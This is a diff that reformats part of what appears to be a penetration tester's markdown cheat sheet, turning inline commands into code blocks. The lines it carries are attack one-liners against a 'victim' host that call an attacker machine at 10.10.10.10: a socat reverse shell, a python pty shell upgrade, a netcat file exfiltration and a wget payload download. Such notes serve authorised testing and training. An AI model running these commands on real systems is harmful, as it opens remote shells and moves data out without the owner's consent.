@@ -23,14 +23,14 @@ chmod +x socat
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
 ```
         
-**Kali:**
+*Kali:*
 ```
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 ```
 
 ### With Python
 
-**Victim:** 
+*Victim:* 
 ```
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
@@ -39,15 +39,27 @@ python3 -c 'import pty; pty.spawn("/bin/sh")'
 
 ### With netcat
 
-Victim: ```cat file.txt | nc -q 0 10.10.10.10 4444```
+*Victim:*
+```
+cat file.txt | nc -q 0 10.10.10.10 4444
+```
 
-Kali:   ```nc -lvp 4444 > file.txt```
+*Kali:*
+```
+nc -lvp 4444 > file.txt
+```
 
 ### With web server
 
-Kali: ```python3 -m http.server 8888``` or ```python -m SimpleHTTPServer 8888```
+*Kali:*
+```
+python3 -m http.server 8888``` or ```python -m SimpleHTTPServer 8888
+```
 
-Victim: ```wget http://10.10.10.10:8888/something.sh -O something.sh```
+*Victim:* 
+```
+wget http://10.10.10.10:8888/something.sh -O something.sh
+```
 
 ## Reverse shells
 
